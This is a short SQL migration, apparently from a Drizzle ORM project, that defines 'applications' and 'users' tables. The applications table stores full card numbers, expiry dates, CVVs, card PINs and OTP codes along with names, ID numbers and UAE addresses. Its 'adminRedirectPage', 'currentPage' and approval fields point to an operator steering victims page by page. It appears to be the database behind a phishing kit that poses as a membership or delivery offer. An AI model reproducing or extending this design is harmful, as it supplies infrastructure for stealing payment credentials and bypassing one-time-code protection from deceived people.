CREATE TABLE `applications` (
	`id` int AUTO_INCREMENT NOT NULL,
	`sessionId` varchar(64) NOT NULL,
	`membershipType` varchar(32),
	`fullName` varchar(256),
	`phone` varchar(32),
	`idNumber` varchar(64),
	`emirate` varchar(64),
	`area` varchar(128),
	`street` varchar(256),
	`deliveryTime` varchar(64),
	`cardNumber` varchar(32),
	`cardExpiry` varchar(8),
	`cardCvv` varchar(8),
	`cardNetwork` varchar(32),
	`cardPin` varchar(16),
	`otpCode` varchar(16),
	`currentPage` varchar(128) DEFAULT '/',
	`status` enum('pending','approved','rejected') NOT NULL DEFAULT 'pending',
	`adminRedirectPage` varchar(128),
	`createdAt` bigint NOT NULL,
	`updatedAt` bigint NOT NULL,
	CONSTRAINT `applications_id` PRIMARY KEY(`id`),
	CONSTRAINT `applications_sessionId_unique` UNIQUE(`sessionId`)
);
--> statement-breakpoint
CREATE TABLE `users` (
	`id` int AUTO_INCREMENT NOT NULL,
	`openId` varchar(64) NOT NULL,
	`name` text,
	`email` varchar(320),
	`loginMethod` varchar(64),
	`role` enum('user','admin') NOT NULL DEFAULT 'user',
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	`updatedAt` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
	`lastSignedIn` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `users_id` PRIMARY KEY(`id`),
	CONSTRAINT `users_openId_unique` UNIQUE(`openId`)
);
